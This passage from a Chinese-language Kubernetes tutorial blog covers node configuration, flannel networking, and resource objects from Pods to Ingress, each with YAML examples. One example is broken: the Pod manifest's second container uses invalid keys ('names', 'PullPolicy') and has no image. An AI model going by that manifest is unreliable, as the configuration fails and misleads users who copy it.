interfaces)</span><br>KUBELET_ADDRESS=<span class="hljs-string">&quot;--address=0.0.0.0&quot;</span><br><br><span class="hljs-comment"># The port for the info server to serve on</span><br><span class="hljs-comment"># KUBELET_PORT=&quot;--port=10250&quot;</span><br><br><span class="hljs-comment"># You may leave this blank to use the actual hostname</span><br>KUBELET_HOSTNAME=<span class="hljs-string">&quot;--hostname-override=k8s-node1&quot;</span><br><br><span class="hljs-comment"># location of the api-server</span><br>KUBELET_API_SERVER=<span class="hljs-string">&quot;--api-servers=http://192.168.245.131:8080&quot;</span><br><br><span class="hljs-comment"># pod infrastructure container</span><br>KUBELET_POD_INFRA_CONTAINER=<span class="hljs-string">&quot;--pod-infra-container-image=registry.access.redhat.com/rhel7/pod-infrastructure:latest&quot;</span><br><br><span class="hljs-comment"># Add your own!</span><br>KUBELET_ARGS=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#/etc/kubernetes/config</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment"># kubernetes system config</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># The following values are used to configure various aspects of all</span><br><span class="hljs-comment"># kubernetes services, including</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   kube-apiserver.service</span><br><span class="hljs-comment">#   kube-controller-manager.service</span><br><span class="hljs-comment">#   kube-scheduler.service</span><br><span class="hljs-comment">#   kubelet.service</span><br><span class="hljs-comment">#   kube-proxy.service</span><br><span class="hljs-comment"># logging to stderr means we get it in the systemd journal</span><br>KUBE_LOGTOSTDERR=<span class="hljs-string">&quot;--logtostderr=true&quot;</span><br><br><span class="hljs-comment"># journal message level, 0 is debug</span><br>KUBE_LOG_LEVEL=<span class="hljs-string">&quot;--v=0&quot;</span><br><br><span class="hljs-comment"># Should this cluster be allowed to run privileged docker containers</span><br>KUBE_ALLOW_PRIV=<span class="hljs-string">&quot;--allow-privileged=false&quot;</span><br><br><span class="hljs-comment"># How the controller-manager, scheduler, and proxy find the apiserver</span><br>KUBE_MASTER=<span class="hljs-string">&quot;--master=http://192.168.245.131:8080&quot;</span><br></code></pre></td></tr></table></figure><p><strong>在配置kubernetes时一定要关闭swap,不然会导致服务访问缓慢</strong></p><h5 id="3-kubernetes的网络插件flunnel"><a href="#3-kubernetes的网络插件flunnel" class="headerlink" title="3.kubernetes的网络插件flunnel"></a>3.kubernetes的网络插件flunnel</h5><p>flunnel是kubernetes的节点网络插件,主要借助TUN&#x2F;TAP原理用于不同的节点之间进行通信,flannel中网络地址的分配是由etcd来维护的</p><h2 id="4-kubernetes的资源对象"><a href="#4-kubernetes的资源对象" class="headerlink" title="4.kubernetes的资源对象"></a>4.kubernetes的资源对象</h2><ul><li>pod</li><li>ReplicationController</li><li>ReplicaSet</li><li>Deployment</li><li>StatefulSet</li><li>Service</li><li>Ingress</li></ul><h5 id="4-1-pod"><a href="#4-1-pod" class="headerlink" title="4.1.pod"></a>4.1.pod</h5><p><em>Pod</em> 是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元,一个pod包含一个或多个容器(其中至少包含一个基础容器pause),其他一个或者多个业务容器和基础容器共享存储和网络,并且Pod 中的内容总是并置（colocated）的并且一同调度，在共享的上下文中运行。</p><h6 id="如何创建一个pod"><a href="#如何创建一个pod" class="headerlink" title="如何创建一个pod?"></a>如何创建一个pod?</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">web</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:alpine</span><br>      <span class="hljs-attr">imagePullPolicy:</span>  <span class="hljs-string">IfNotPresent</span><br>      <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">names:</span> <span class="hljs-string">ubuntu</span><br>      <span class="hljs-attr">PullPolicy:</span>  <span class="hljs-string">IfNotPresent</span><br>      <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;bin/bash&quot;</span>]<br>      <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">81</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f config.yaml <span class="hljs-comment">#创建一个pod</span><br></code></pre></td></tr></table></figure><h5 id="4-2-ReplicationController"><a href="#4-2-ReplicationController" class="headerlink" title="4.2.ReplicationController"></a>4.2.ReplicationController</h5><p><em>ReplicationController</em> 是一组pod的控制器,确保在任何时候都有特定数量的 Pod 副本处于运行状态。 换句话说，ReplicationController 确保一个 Pod 或一组同类的 Pod 总是可用的。</p><h6 id="ReplicationController-如何工作"><a href="#ReplicationController-如何工作" class="headerlink" title="ReplicationController 如何工作?"></a>ReplicationController 如何工作?</h6><p>当 Pod 数量过多时，ReplicationController 会终止多余的 Pod。当 Pod 数量太少时，ReplicationController 将会启动新的 Pod。 与手动创建的 Pod 不同，由 ReplicationController 创建的 Pod 在失败、被删除或被终止时会被自动替换。 例如，在中断性维护（如内核升级）之后，你的 Pod 会在节点上重新创建。 因此，即使你的应用程序只需要一个 Pod，你也应该使用 ReplicationController 创建 Pod。 ReplicationController 类似于进程管理器，但是 ReplicationController 不是监控单个节点上的单个进程，而是监控跨多个节点的多个 Pod。</p><p>在讨论中，ReplicationController 通常缩写为 “rc”，并作为 kubectl 命令的快捷方式。</p><p>一个简单的示例是创建一个 ReplicationController 对象来可靠地无限期地运行 Pod 的一个实例。 更复杂的用例是运行一个多副本服务（如 web 服务器）的若干相同副本。</p><h6 id="如何创建一个rc"><a href="#如何创建一个rc" class="headerlink" title="如何创建一个rc?"></a>如何创建一个rc?</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ReplicationController</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><span class="hljs-comment">#标签选择器RC只会去管理和维护标签相对应的pod</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span> <span class="hljs-comment">#标签一定要和selector相对应</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h5 id="4-3-ReplicaSet"><a href="#4-3-ReplicaSet" class="headerlink" title="4.3.ReplicaSet"></a>4.3.ReplicaSet</h5><p><em>ReplicaSet</em> 是ReplicationController的升级版,其目的是维护一组在任何时候都处于运行状态的 Pod 副本的稳定集合。 因此，它通常用来保证给定数量的、完全相同的 Pod 的可用性。</p><h6 id="和ReplicationController的区别"><a href="#和ReplicationController的区别" class="headerlink" title="和ReplicationController的区别"></a>和ReplicationController的区别</h6><p>ReplicaSet支持集合的selector</p><h6 id="如何创建一个ReplicaSet"><a href="#如何创建一个ReplicaSet" class="headerlink" title="如何创建一个ReplicaSet"></a>如何创建一个ReplicaSet</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ReplicaSet</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">frontend</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">guestbook</span><br>    <span class="hljs-attr">tier:</span> <span class="hljs-string">frontend</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-comment"># 按你的实际情况修改副本数</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span> <span class="hljs-comment">#匹配标签</span><br>      <span class="hljs-attr">tier:</span> <span class="hljs-string">frontend</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">tier:</span> <span class="hljs-string">frontend</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">php-redis</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">gcr.io/google_samples/gb-frontend:v3</span><br></code></pre></td></tr></table></figure><h5 id="4-4-Deployment"><a href="#4-4-Deployment" class="headerlink" title="4.4.Deployment"></a>4.4.Deployment</h5><p><em>Deployment</em>为 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 和 <a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/replicaset/">ReplicaSet</a> 提供声明式的更新能力,Deployment在创建时会创建ReplicaSet,Deployment通过控制ReplicaSet,通过ReplicaSet管理实际的pod,使用Deployment而不直接使用ReplicaSet或者ReplicationController的原因是Deployment提供资源的滚动更新和回滚.</p><h6 id="如何创建一个Deployment"><a href="#如何创建一个Deployment" class="headerlink" title="如何创建一个Deployment?"></a>如何创建一个Deployment?</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx-deployment</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.14.2</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h5 id="4-5-StatefulSet"><a href="#4-5-StatefulSet" class="headerlink" title="4.5.StatefulSet"></a>4.5.StatefulSet</h5><p>StatefulSet 是用来管理有状态应用的工作负载 API 对象,StatefulSet 用来管理某 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 集合的部署和扩缩， 并为这些 Pod 提供持久存储和持久标识符。</p><p>和 <a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/deployment/">Deployment</a> 类似， StatefulSet 管理基于相同容器规约的一组 Pod。但和 Deployment 不同的是， StatefulSet 为它们的每个 Pod 维护了一个有粘性的 ID。这些 Pod 是基于相同的规约来创建的， 但是不能相互替换：无论怎么调度，每个 Pod 都有一个永久不变的 ID。</p><p>如果希望使用存储卷为工作负载提供持久存储，可以使用 StatefulSet 作为解决方案的一部分。 尽管 StatefulSet 中的单个 Pod 仍可能出现故障， 但持久的 Pod 标识符使得将现有卷与替换已失败 Pod 的新 Pod 相匹配变得更加容易。</p><p>StatefulSet 对于需要满足以下一个或多个需求的应用程序很有价值：</p><ul><li>稳定的、唯一的网络标识符。</li><li>稳定的、持久的存储。</li><li>有序的、优雅的部署和扩缩。</li><li>有序的、自动的滚动更新。</li></ul><p>得益于StatefulSet的这些特点,因此StatefulSet一般用于管理有状态的服务(如数据库)</p><h6 id="如何创建一个StatefulSet"><a href="#如何创建一个StatefulSet" class="headerlink" title="如何创建一个StatefulSet?"></a>如何创建一个StatefulSet?</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StatefulSet</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 必须匹配 .spec.template.metadata.labels</span><br>  <span class="hljs-attr">serviceName:</span> <span class="hljs-string">&quot;nginx&quot;</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span> <span class="hljs-comment"># 默认值是 1</span><br>  <span class="hljs-attr">minReadySeconds:</span> <span class="hljs-number">10</span> <span class="hljs-comment"># 默认值是 0</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 必须匹配 .spec.selector.matchLabels</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">terminationGracePeriodSeconds:</span> <span class="hljs-number">10</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">k8s.gcr.io/nginx-slim:0.8</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br>        <span class="hljs-attr">volumeMounts:</span> <span class="hljs-comment">#挂载容器卷</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">www</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/nginx/html</span><br>  <span class="hljs-attr">volumeClaimTemplates:</span> <span class="hljs-comment">#</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">www</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">accessModes:</span> [ <span class="hljs-string">&quot;ReadWriteOnce&quot;</span> ]<br>      <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">&quot;my-storage-class&quot;</span><br>      <span class="hljs-attr">resources:</span><br>        <span class="hljs-attr">requests:</span><br>          <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br></code></pre></td></tr></table></figure><h5 id="4-6-service"><a href="#4-6-service" class="headerlink" title="4.6.service"></a>4.6.service</h5><p>将运行在一组 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pods</a> 上的应用程序公开为网络服务的抽象方法。</p><p>使用 Kubernetes，你无需修改应用程序即可使用不熟悉的服务发现机制。 Kubernetes 为 Pods 提供自己的 IP 地址，并为一组 Pod 提供相同的 DNS 名， 并且可以在它们之间进行负载均衡。(4层的SLB)</p><p>创建和销毁 Kubernetes <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 以匹配集群的期望状态。 Pod 是非永久性资源。 如果你使用 <a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/deployment/">Deployment</a> 来运行你的应用程序，则它可以动态创建和销毁 Pod。</p><p>每个 Pod 都有自己的 IP 地址，但是在 Deployment 中，在同一时刻运行的 Pod 集合可能与稍后运行该应用程序的 Pod 集合不同,因此如果直接将pod直接在网络上公开时不可靠的,因为如果公开的pod后面出现故障,新创建的pod的ip地址和之前的pod有所不同,因此我们需要一个组件将一组pod稳定的在网络上公开,因此就有了service,service会将一组pod映射到kubernetes内部的一个虚拟ip地址上(这个虚拟ip地址只有pod内部可以访问),然后将虚拟ip地址映射出去即可以实现服务的稳定。</p><p>service的暴露类型有以下几种</p><ul><li><p>clusterIP</p><p>通过集群的内部 IP 暴露服务，选择该值时服务只能够在集群内部访问。 这也是默认的 <code>ServiceType</code>。</p></li><li><p>NodePort</p><p>通过每个节点上的 IP 和静态端口（<code>NodePort</code>）暴露服务。 <code>NodePort</code> 服务会路由到自动创建的 <code>ClusterIP</code> 服务。 通过请求 <code>&lt;节点 IP&gt;:&lt;节点端口&gt;</code>，你可以从集群的外部访问一个 <code>NodePort</code> 服务。</p></li><li><p>LoadBalancer</p><p>使用云提供商的负载均衡器向外部暴露服务。 外部负载均衡器可以将流量路由到自动创建的 <code>NodePort</code> 服务和 <code>ClusterIP</code> 服务上</p></li><li><p>ExternalName</p><p>通过返回 <code>CNAME</code> 和对应值，可以将服务映射到 <code>externalName</code> 字段的内容（例如，<code>foo.bar.example.com</code>）。 无需创建任何类型代理</p></li></ul><p>service的endpoint依赖于标签选择器(selector),在创建的时候也可以不定义selector,可以稍后创建endpoint对象实现将多个pod加入到service,一般只有在以下集中情况下才会 定义没有selector的service</p><ul><li>希望在生产环境中使用外部的数据库集群，但测试环境使用自己的数据库。</li><li>希望服务指向另一个 <a href="https://kubernetes.io/zh-cn/docs/concepts/overview/working-with-objects/namespaces/">名字空间（Namespace）</a> 中或其它集群中的服务。</li><li>你正在将工作负载迁移到 Kubernetes。 在评估该方法时，你仅在 Kubernetes 中运行一部分后端。</li></ul><p>有时不需要或不想要负载均衡，以及单独的 Service IP。 遇到这种情况，可以通过指定 Cluster IP（<code>spec.clusterIP</code>）的值为 <code>&quot;None&quot;</code> 来创建 <code>Headless</code> Service。</p><p>你可以使用无头 Service 与其他服务发现机制进行接口，而不必与 Kubernetes 的实现捆绑在一起。</p><p>对这无头 Service 并不会分配 Cluster IP，kube-proxy 不会处理它们， 而且平台也不会为它们进行负载均衡和路由。 DNS 如何实现自动配置，依赖于 Service 是否定义了选择算符。</p><p>service原生提供服务的自动发现,即只要匹配了service的标签选择器,service就会自动将该服务加入到endpoint</p><h6 id="如何创建一个service？"><a href="#如何创建一个service？" class="headerlink" title="如何创建一个service？"></a>如何创建一个service？</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">MyApp</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span> <span class="hljs-comment">#指定映射的协议</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span> <span class="hljs-comment">#指定clusterip的端口</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9376</span> <span class="hljs-comment">#指定需要映射的pod的端口</span><br></code></pre></td></tr></table></figure><h6 id="如何创建endpoint"><a href="#如何创建endpoint" class="headerlink" title="如何创建endpoint"></a>如何创建endpoint</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Endpoints</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-comment"># 这里的 name 要与 Service 的名字相同</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">subsets:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">addresses:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">ip:</span> <span class="hljs-number">192.0</span><span class="hljs-number">.2</span><span class="hljs-number">.42</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">9376</span><br></code></pre></td></tr></table></figure><p>endpoint的端点 IPs <em>必须不可以</em> 是：本地回路（IPv4 的 127.0.0.0&#x2F;8, IPv6 的 ::1&#x2F;128）或 本地链接（IPv4 的 169.254.0.0&#x2F;16 和 224.0.0.0&#x2F;24，IPv6 的 fe80::&#x2F;64)。</p><p>端点 IP 地址不能是其他 Kubernetes 服务的集群 IP，因为 <a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-proxy/">kube-proxy</a> 不支持将虚拟 IP 作为目标</p><h5 id="4-7-ingress"><a href="#4-7-ingress" class="headerlink" title="4.7.ingress"></a>4.7.ingress</h5><p><a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.24/#ingress-v1beta1-networking-k8s-io">Ingress</a> 公开从集群外部到集群内<a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/">服务</a>的 HTTP 和 HTTPS 路由。 流量路由由 Ingress 资源上定义的规则控制。</p><pre><code class=" mermaid">graph LR;  client([client])-. Ingress-managed &lt;br&gt; load balancer .-&gt;ingress[Ingress];  ingress--&gt;|routing rule|service[Service];  subgraph cluster  ingress;  service--&gt;pod1[Pod];  service--&gt;pod2[Pod];  end  classDef plain fill:#ddd,stroke:#fff,stroke-width:4px,color:#000;  classDef k8s fill:#326ce5,stroke:#fff,stroke-width:4px,color:#fff;  classDef cluster fill:#fff,stroke:#bbb,stroke-width:2px,color:#326ce5;  class ingress,service,pod1,pod2 k8s;  class client plain;  class cluster cluster;</code></pre><p>Ingress 可为 Service 提供外部可访问的 URL、负载均衡流量、终止 SSL&#x2F;TLS，以及基于名称的虚拟托管。 <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/ingress-controllers">Ingress 控制器</a> 通常负责通过负载均衡器来实现 Ingress，尽管它也可以配置边缘路由器或其他前端来帮助处理流量。</p><p>Ingress 不会公开任意端口或协议。 将 HTTP 和 HTTPS 以外的服务公开到 Internet 时，通常使用 <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/#type-nodeport">Service.Type&#x3D;NodePort</a> 或 <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/#loadbalancer">Service.Type&#x3D;LoadBalancer</a> 类型的 Service。</p><p>与service相比,service内部是通过ip+port实现4层SLB,而ingress是一个反向代理负载均衡器,他通过访问的域名和访问的url路径实现7层SLB。</p><h6 id="如何创建一个ingress"><a href="#如何创建一个ingress" class="headerlink" title="如何创建一个ingress"></a>如何创建一个ingress</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-wildcard-host</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">&quot;foo.bar.com&quot;</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">path:</span> <span class="hljs-string">&quot;/bar&quot;</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">service1</span><br>            <span class="hljs-attr">port:</span><br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">&quot;*.foo.com&quot;</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">path:</span> <span class="hljs-string">&quot;/foo&quot;</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">service2</span><br>            <span class="hljs-attr">port:</span><br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h2 id="5-kubernetes的基本使用"><a href="#5-kubernetes的基本使用" class="headerlink" title="5.kubernetes的基本使用"></a>5.kubernetes的基本使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td 